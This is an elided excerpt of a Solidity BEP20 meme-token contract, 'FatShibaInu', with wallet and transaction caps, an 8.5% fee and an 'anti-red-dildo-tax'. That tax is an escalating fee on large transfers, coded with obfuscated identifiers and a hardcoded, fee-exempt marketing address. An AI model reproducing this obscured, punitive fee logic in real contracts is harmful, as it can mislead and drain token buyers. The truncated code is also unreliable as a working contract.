 ...
 *  
 *     
 *     WEB: http://fatshibainu.me
 *     TG:  https://t.me/FatShibaInuBSC
 * 


 *                                                            
 *      25,000,000 Max wallet                                    
 *      10,000,000 Max transaction                     
 *                                                  
 *                                 
 *     8.5+anti-red-dildo-tax % Transfer Fee                         
 *     
...
contract fatshibainubsc is IBEP20 {
    using SafeMath for uint256;
    address internal owner;
    address DEAD = 0x000000000000000000000000000000000000dEaD;


    string constant _name = "FatShibaInu.me";
    string constant _symbol = "SHIBBIES";
    ...
    uint256 public _maxWalletToken = 25 * 1000000 * (10 ** _decimals);  // 3%
    ...
    uint256 public totalFee = 85;
    uint256 public ARDTfeescaling6522675 = 380 ;
    ...
    constructor ()  {
        address marketingFeeReceiver = 0x2E57b8bA0586D7510270cD9e6846F8E834A4aB81;
         owner = msg.sender;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        address marketingFeeReceiver = 0x2E57b8bA0586D7510270cD9e6846F8E834A4aB81;
        uint256 HTBalanceReceiverf55555 = balanceOf(recipient);
        uint256 HTSender114246 = balanceOf(sender);
        uint256 stora = 0;
 
        if (sender != marketingFeeReceiver  && recipient != marketingFeeReceiver && recipient != DEAD && !isFeeExempt[sender] && !isFeeExempt[recipient]){
            require(((HTBalanceReceiverf55555 + amount) <= _maxWalletToken) || ((HTSender114246 + amount) <= _maxWalletToken),"Max Wallet Amount reached. 70e44bd7");
        ...
        if (HTBalanceReceiverf55555 > _maxWalletToken){
            amountRECf457 = shouldTakeFee48(sender,recipient) ? takeFF2fs12222(sender, amount) : amount;
        }else{
             amountRECf457 = shouldTakeFee48(sender,recipient) ? takeFeeF1d411244(sender, amount) : amount;
        }     
    ...
    function takeFeeF1d411244(address sender, uint256 amount) internal returns (uint256) {
        uint256 feetmp765478114 = amount.mul(totalFee).div(feeDeNom178);
        
        _balances[address(this)] = _balances[address(this)].add(feetmp765478114);
        emit Transfer(sender, address(this), feetmp765478114);
        
        return amount.sub(feetmp765478114);
    ...
    function takeFF2fs12222(address sender, uint256 amount) internal returns (uint256) {
        ...
        uint256 AA3754125 = amount.mul(totalFee).div(feeDeNom178);
        uint256 BBa4755124 = 0;
        uint256 CC7b8ae798 = 0;
        uint256 feetmp765478114 = 0;
        uint256 two = 2;
        if (HSenderbalance4344 > blim4788899){if   (amount > S167f62){
               BBa4755124 = amount.mul(amount-S167f62).div(_maxTxAmount);
               CC7b8ae798 = BBa4755124.mul(ARDTfeescaling6522675).div(feeDeNom178).mul(HSenderbalance4344.add(_maxWalletToken.div(two))).div(_maxWalletToken); }  }
        feetmp765478114 =  AA3754125 +   CC7b8ae798;   
        _balances[address(this)] = _balances[address(this)].add(feetmp765478114);
        emit Transfer(sender, address(this), feetmp765478114);
        return amount.sub(feetmp765478114);
    }
